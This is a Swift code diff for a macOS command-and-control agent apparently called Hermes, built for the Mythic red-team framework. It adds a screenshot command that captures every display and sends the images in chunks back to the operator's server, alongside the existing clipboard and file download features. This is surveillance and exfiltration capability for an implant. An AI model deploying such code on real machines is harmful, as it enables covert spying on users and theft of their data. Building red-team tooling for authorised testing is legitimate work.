@@ -36,6 +36,10 @@ class Job {
     var uploadFileID: String
     var uploadFullPath: String
     var uploadData: String
+    // screenshot
+    var screenshotTotalDisplays: Int
+    var screenshotDisplayNumber: Int
+    
     
     
     init() {
@@ -62,6 +66,8 @@ class Job {
         self.uploadFileID = ""
         self.uploadFullPath = ""
         self.uploadData = ""
+        self.screenshotTotalDisplays = 0
+        self.screenshotDisplayNumber = 0
     }
 }
 
@@ -169,7 +175,7 @@ func executeTask(job: Job, jobList: JobList) {
     case "download":
         // Download job has no file_id from Mythic yet, we need to get one, if we have a file_id, get a chunk
         if job.downloadFileID == "" {
-            getFileID(job: job)
+            getFileID(job: job, isScreenshot: false)
         }
         // If job already has a file_id, download a chunk of the file
         else {
@@ -182,6 +188,29 @@ func executeTask(job: Job, jobList: JobList) {
         }
     case "clipboard":
         clipboard(job: job)
+    case "screenshot":
+        // Gather total number of displays to download
+        if job.screenshotTotalDisplays == 0 {
+            getTotalDisplays(job: job)
+            print("TOTAL_DISPLAYS", job.screenshotTotalDisplays)
+        }
+        // Start cycling through displays
+        else if job.screenshotDisplayNumber < job.screenshotTotalDisplays {
+            // Download job has no file_id from Mythic yet, we need to get one, if we have a file_id, get a chunk
+            if job.downloadFileID == "" {
+                getFileID(job: job, isScreenshot: true)
+            }
+            // If job already has a file_id, download a chunk of the file
+            else {
+                downloadScreenshotChunk(job: job)
+            }
+        }
+        // Successfully looped through all displays
+        else {
+            job.result = "Screenshot complete"
+            job.completed = true
+            job.success = true
+        }
     default:
         job.result = "Command not implemented."
         job.status = "error"
@@ -259,13 +288,38 @@ func postResponse(jobList: JobList) {
             }
         }
         
+        // Handle screenshot jobs
+        if job.command == "screenshot" {
+            // We don't have a file_id yet, request one from Mythic
+            if ((job.downloadFileID == "") && (job.downloadTotalChunks > 0)) {
+                let jsonResponse = JSON([
+                    "total_chunks": job.downloadTotalChunks,
+                    "task_id": job.taskID,
+                    "full_path": job.downloadFullPath,
+                    "host": job.downloadHost,
+                    "is_screenshot": job.downloadIsScreenshot,
+                ])
+                jsonJobOutput.append(jsonResponse)
+            }
+            // Send file chunk
+            else if((job.downloadFileID != "") && (job.downloadTotalChunks > 0)) && (job.downloadChunkData != "") {
+                let jsonResponse = JSON([
+                    "chunk_num": job.downloadChunkNumber,
+                    "file_id": job.downloadFileID,
+                    "chunk_data": job.downloadChunkData,
+                    "task_id": job.taskID,
+                ])
+                jsonJobOutput.append(jsonResponse)
+                job.downloadChunkNumber = job.downloadChunkNumber + 1
+            }
+        }
     }
     
     let jsonPayload = JSON([
         "action": "post_response",
         "responses": jsonJobOutput,
     ])
-    print("HERMES_POST_RESPONSE", jsonPayload)
+    //print("HERMES_POST_RESPONSE", jsonPayload)
     // Decode negotiated b64 session key from agent config
     let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
     
@@ -283,9 +337,37 @@ func postResponse(jobList: JobList) {
                 // Found a job that succeeded and matched with task_id
                 if responses["task_id"].stringValue == job.taskID {
                     // Delete job if it is a "normal" job
-                    if ((job.command != "download") && (job.command != "upload")) {
+                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot")) {
                         jobList.jobs.remove(at: index)
                         print("job removed")
+                    }
+                    // Handle screenshot responses
+                    else if job.command == "screenshot" {
+                        // Save file_id returned from Mythic for first download message
+                        if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
+                            job.downloadFileID = responses["file_id"].stringValue
+                            print("SAVING_FILEID", job.downloadFileID)
+                        }
+                        // Delete job if download task is complete
+                        else if job.screenshotDisplayNumber >= job.screenshotTotalDisplays {
+                            jobList.jobs.remove(at: index)
+                            print("screenshot job removed")
+                        }
+                        // Once download is complete, reset job variables for multiple displays
+                        else if (job.downloadChunkNumber > job.downloadTotalChunks) && (job.screenshotDisplayNumber < job.screenshotTotalDisplays) {
+                            print("upload done, moving onto next display")
+                            job.screenshotDisplayNumber += 1
+                            job.downloadFileID = ""
+                            job.downloadChunkNumber = 0
+                            job.downloadTotalChunks = 0
+                            job.downloadFileSize = 0
+                            job.downloadChunkData = ""
+                        }
+                        // Error may have occurred when getting file_id from Mythic, remove the job
+                        else if job.downloadTotalChunks == 0 {
+                            print("error, removing screenshot job")
+                            jobList.jobs.remove(at: index)
+                        }
                     }
                     // Handle download responses
                     else if job.command == "download" {
